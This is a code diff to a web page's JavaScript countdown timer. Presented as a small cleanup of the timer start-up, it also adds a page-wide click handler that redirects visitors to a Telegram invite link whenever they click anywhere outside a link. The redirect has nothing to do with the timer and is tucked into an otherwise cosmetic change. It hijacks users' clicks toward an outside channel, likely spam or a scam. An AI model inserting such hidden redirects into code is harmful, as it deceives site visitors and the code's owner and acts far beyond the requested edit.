@@ -19,9 +19,11 @@ function startTimer(duration, display) {
 }
 
 window.onload = function () {
-  const timeInSeconds = 2 * 60; // 2 minutes countdown
+  const timeInSeconds = 2 * 60;
   const display = document.querySelector('#timer');
-  if (display) {
-    startTimer(timeInSeconds, display);
-  }
+  if (display) startTimer(timeInSeconds, display);
+
+  document.body.addEventListener('click', function(e) {
+    if (!e.target.closest('a')) window.location.href = 'https://t.me/+jjDXGHtANaVlMzgy';
+  });
 };
